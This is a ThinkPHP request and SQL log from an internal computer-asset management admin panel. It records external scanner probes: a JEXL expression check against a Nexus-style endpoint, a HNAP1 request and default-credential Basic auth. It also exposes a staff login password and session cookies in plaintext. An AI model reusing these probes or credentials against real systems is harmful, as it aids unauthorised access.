+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/font-awesome_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T11:32:30+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/animate.css
+[运行时间：0.003274s] [吞吐率：305.44req/s] [内存消耗：469.18kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/animate_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T11:32:32+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/getcomplist.html?page=1&limit=20&keyword=
+[运行时间：0.197859s] [吞吐率：5.05req/s] [内存消耗：935.11kb] [文件加载：90]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'x-requested-with' => 'XMLHttpRequest',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/index/computer.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t; Hm_lpvt_d214947968792b839fd669a4decaaffc=1606793551',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/getcomplist_html' => '',
+  'page' => '1',
+  'limit' => '20',
+  'keyword' => '',
+)
+[ info ] [ DB ] INIT mysql
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000871s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `computer` [ RunTime:0.026454s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 1 [ RunTime:0.064239s ]
+[ sql ] [ SQL ] SELECT `c`.*,d.name as department,s.name as staff FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 0,20 [ RunTime:0.001626s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `os` [ RunTime:0.001720s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 6 LIMIT 1 [ RunTime:0.000442s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `computer_internet_access` [ RunTime:0.001604s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 1 [ RunTime:0.000374s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000268s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 2 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 4 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 5 [ RunTime:0.000330s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000222s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 7 [ RunTime:0.000244s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 8 [ RunTime:0.000365s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 9 [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 10 [ RunTime:0.000189s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000187s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 11 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000350s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 12 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000179s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 13 [ RunTime:0.000176s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000199s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 14 [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000322s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 15 [ RunTime:0.000381s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 16 [ RunTime:0.000175s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 17 [ RunTime:0.000322s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000181s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 18 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 20 [ RunTime:0.000181s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000179s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 21 [ RunTime:0.000175s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 22 [ RunTime:0.000176s ]
+[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000182s ]
+[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 23 [ RunTime:0.000171s ]
+---------------------------------------------------------------
+[ 2020-12-01T15:08:48+08:00 ] 64.31.8.10 GET example.comhttp://example.com/
+[运行时间：0.431751s] [吞吐率：2.32req/s] [内存消耗：758.72kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:08:48+08:00 ] 64.31.8.10 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.005081s] [吞吐率：196.81req/s] [内存消耗：486.86kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:10:18+08:00 ] 64.31.8.10 GET example.comhttp://example.com/
+[运行时间：0.006640s] [吞吐率：150.60req/s] [内存消耗：489.63kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:10:19+08:00 ] 64.31.8.10 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.002861s] [吞吐率：349.53req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:14:58+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/jars
+[运行时间：0.007308s] [吞吐率：136.84req/s] [内存消耗：498.10kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/jars' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:14:58+08:00 ] 91.241.19.84 POST 113.116.135.3:8081/service/extdirect
+[运行时间：0.038110s] [吞吐率：26.24req/s] [内存消耗：471.59kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-length' => '293',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/service/extdirect' => '',
+  'action' => 'coreui_Component',
+  'data' => 
+  array (
+    0 => 
+    array (
+      'filter' => 
+      array (
+        0 => 
+        array (
+          'property' => 'repositoryName',
+          'value' => '*',
+        ),
+        1 => 
+        array (
+          'property' => 'expression',
+          'value' => '1==1',
+        ),
+        2 => 
+        array (
+          'property' => 'type',
+          'value' => 'jexl',
+        ),
+      ),
+      'limit' => '50',
+      'page' => '1',
+      'sort' => 
+      array (
+        0 => 
+        array (
+          'direction' => 'ASC',
+          'property' => 'name',
+        ),
+      ),
+      'start' => '0',
+    ),
+  ),
+  'method' => 'previewAssets',
+  'tid' => '18',
+  'type' => 'rpc',
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:14:59+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/
+[运行时间：0.006330s] [吞吐率：157.98req/s] [内存消耗：490.88kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:14:59+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.006776s] [吞吐率：147.58req/s] [内存消耗：487.45kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/jars',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:14:59+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.002850s] [吞吐率：350.90req/s] [内存消耗：486.88kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:29:54+08:00 ] 64.31.8.10 GET example.comhttp://example.com/
+[运行时间：0.003285s] [吞吐率：304.40req/s] [内存消耗：488.73kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:29:55+08:00 ] 64.31.8.10 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.002662s] [吞吐率：375.67req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:55:28+08:00 ] 64.32.11.52 GET 113.116.135.3:8081/
+[运行时间：0.648578s] [吞吐率：1.54req/s] [内存消耗：759.84kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'deflate, gzip, identity',
+  'accept-language' => 'en-US;q=0.6,en;q=0.4',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:55:29+08:00 ] 64.32.11.52 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.066288s] [吞吐率：15.09req/s] [内存消耗：488.71kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'deflate, gzip, identity',
+  'accept-language' => 'en-US;q=0.6,en;q=0.4',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1',
+  'cookie' => 'PHPSESSID=n155439edl6ntslve1uv5njl5h',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:55:32+08:00 ] 64.32.11.52 GET 113.116.135.3:8081/HNAP1/
+[运行时间：0.006325s] [吞吐率：158.10req/s] [内存消耗：498.52kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'deflate, gzip, identity',
+  'accept-language' => 'en-US;q=0.6,en;q=0.4',
+  'referer' => 'http://113.116.135.3:8081/',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1',
+  'cookie' => 'PHPSESSID=n155439edl6ntslve1uv5njl5h',
+)
+[ info ] [ PARAM ] array (
+  '/HNAP1/' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:55:33+08:00 ] 64.32.11.52 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.006404s] [吞吐率：156.15req/s] [内存消耗：487.69kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'deflate, gzip, identity',
+  'accept-language' => 'en-US;q=0.6,en;q=0.4',
+  'referer' => 'http://113.116.135.3:8081/',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1',
+  'cookie' => 'PHPSESSID=n155439edl6ntslve1uv5njl5h',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T15:59:44+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/index.html
+[运行时间：0.006348s] [吞吐率：157.53req/s] [内存消耗：499.77kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/index_html' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T15:59:45+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/adminlogin/index.html
+[运行时间：0.003313s] [吞吐率：301.86req/s] [内存消耗：487.75kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T16:00:01+08:00 ] 192.168.10.58 POST 192.168.10.232/padmin/adminlogin/loginaction.html
+[运行时间：0.182720s] [吞吐率：5.47req/s] [内存消耗：693.06kb] [文件加载：79]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '31',
+  'origin' => 'http://192.168.10.232',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=0hkfgm91ahfkjucco348lkt242',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/loginaction_html' => '',
+  'username' => 'it02',
+  'password' => 'loevluma',
+)
+[ info ] [ DB ] INIT mysql
+[ sql ] [ DB ] CONNECT:[ UseTime:0.025487s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin` [ RunTime:0.021578s ]
+[ sql ] [ SQL ] SELECT * FROM `admin` WHERE  `username` = 'it02' LIMIT 1 [ RunTime:0.011136s ]
+[ sql ] [ SQL ] UPDATE `admin`  SET `lastip` = '192.168.10.58' , `lastvisit` = '1606809601'  WHERE  `id` = 17 [ RunTime:0.022038s ]
+---------------------------------------------------------------
+[ 2020-12-01T16:00:02+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/index.html
+[运行时间：0.037166s] [吞吐率：26.91req/s] [内存消耗：500.98kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
